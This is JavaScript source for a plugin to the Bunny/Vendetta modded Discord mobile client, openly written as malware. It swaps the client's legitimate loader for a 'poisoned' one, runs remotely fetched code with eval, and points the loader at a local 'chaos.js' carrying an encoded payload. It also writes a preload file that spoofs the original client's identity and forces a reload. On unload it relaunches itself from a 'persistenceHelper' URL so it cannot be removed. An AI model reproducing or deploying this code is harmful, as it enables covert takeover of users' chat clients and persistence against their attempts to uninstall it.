//import { instead } from "@vendetta/patcher";
// import { General, Forms } from "@vendetta/ui/components";
// import { findByProps, findByName } from "@vendetta/metro";
// const { View, ScrollView } = General;
export default {
  onLoad: async () => {
    // replace the legit mod (vendetta/bunny/revenge) with our own poisoned one (also could be a loader that loads a real one with patches)

    const sections = window.bunny.ui.settings.registeredSections;
    const client_settings_section = sections[Object.keys(sections)[0]][0];

    window.bunny.api.settings.loaderConfig.customLoadUrl.enabled = true;
    if (
      window.bunny.api.settings.loaderConfig.fakeCustomLoadUrl === undefined
    ) {
      window.bunny.api.settings.loaderConfig.fakeCustomLoadUrl = {
        enabled: false,
        url: "http://localhost:4040/bunny.js",
      };
    }
    if (window.malcord === undefined || !window.malcord) {
      if (window.OGClientInfo === undefined || !window.OGClientInfo) {
        // bunny.utils.logger.log("installing oglciekt info file");
        let discord_server = await bunny.api.native.fs
          .readFile("bundle.js")
          .then((e) => /DISCORD_SERVER = "(.*?)";/.exec(e)[1]);
        let github = await bunny.api.native.fs
          .readFile("bundle.js")
          .then((e) => /GITHUB = "(.*?)";/.exec(e)[1]);
        const preloadInfo = {
          name:
            client_settings_section.title?.().replaceAll(" ", "/*\\") ||
            "Bunny",
          icon: client_settings_section.icon,
          discord_server:
            discord_server || window.vendetta.constants.DISCORD_SERVER,
          github: github || window.vendetta.constants.GITHUB,
          subtitle:
            client_settings_section.rawTabsConfig
              ?.useTrailing?.()
              .replaceAll(" ", "/*\\") || "",
        };
        const preloadScript = `(()=>{globalThis.OGClientInfo = ${JSON.stringify(
          preloadInfo
        )};})()`
          .replaceAll("\\s", "")
          .replaceAll("/*\\", " ");
        fetch(
          "https://raw.githubusercontent.com/MaxArt2501/base64-js/refs/heads/master/base64.js" // base64 polyfill cuz im dumb
        )
          .then((e) => e.text())
          .then((t) => {
            eval(t);

            const encoded = btoa(preloadScript);
            window.bunny.api.settings.loaderConfig.customLoadUrl.url = `http://127.0.0.1/chaos/chaos.js?42=${encoded}`;
          });
        window.bunny.api.native.fs.writeFile(
          "preloads/OriginalClient.js",
          preloadScript
        );
      }
      setTimeout(
        () =>
          window.bunny.metro.common.ReactNative.NativeModules.BundleUpdaterManager.reload(),
        1000
      );
    }
  },
  onUnload: async () => {
    window.vendetta.plugins.startPlugin(
      "http://127.0.0.1/chaos/persistenceHelper/"
    );
    // Unload the plugin - just kidding we tell bunny to fuck of and load the plugin again lol
  },
};
